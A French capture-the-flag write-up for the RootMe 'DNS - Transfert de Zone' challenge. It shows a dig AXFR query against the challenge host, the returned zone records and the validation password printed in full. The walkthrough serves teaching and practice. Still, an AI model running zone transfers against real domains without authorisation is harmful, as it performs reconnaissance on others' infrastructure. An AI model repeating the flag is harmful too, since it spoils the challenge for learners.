# Challenge RootMe :DNS - Transfert de Zone

**Catégorie** : Réseau  
**Difficulté** : ⭐⭐.
**Objectif** : Récupérer le mot de passe de validation en exploitant une mauvaise configuration de transfert de zone DNS.

---

## 📝 Étapes de résolution

### 1. Identification de la cible
- **Hôte** : `challenge01.root-me.org`
- **Port** : `54011`
- **Domaine** : `ch11.challenge01.root-me.org`
- **Protocole** : `DNS`

### 2. Exécution de la commande de transfert de zone
Utilisation de l'outil `dig` pour lancer une requête de transfert de zone :
```bash
dig @challenge01.root-me.org -p 54011 AXFR ch11.challenge01.root-me.org.
```

### 3. Analyse de la réponse DNS

La réponse obtenue présente plusieurs enregistrements DNS. Un extrait significatif de la réponse est le suivant :

```bash
ch11.challenge01.root-me.org. 604800 IN SOA     ch11.challenge01.root-me.org. root.ch11.challenge01.root-me.org. 2 604800 86400 2419200 604800
ch11.challenge01.root-me.org. 604800 IN TXT     "DNS transfer secret key : CBkFRwfNMMtRjHY"
ch11.challenge01.root-me.org. 604800 IN NS      ch11.challenge01.root-me.org.
ch11.challenge01.root-me.org. 604800 IN A       127.0.0.1
challenge01.ch11.challenge01.root-me.org. 604800 IN A 192.168.27.101
```

### 4. Récupération du mot de passe

L'enregistrement TXT contient le mot de passe de validation :

```plaintext
DNS transfer secret key : CBkFRwfNMMtRjHY
```
Ce qui nous permet d'obtenir directement le flag.

**🛠 Outils utilisés**
- dig : Utilitaire DNS en ligne de commande
- Terminal UNIX/Linux : Pour exécuter la commande

**🏆 Solution finale**
Mot de passe :
```plaintext
CBkFRwfNMMtRjHY
```
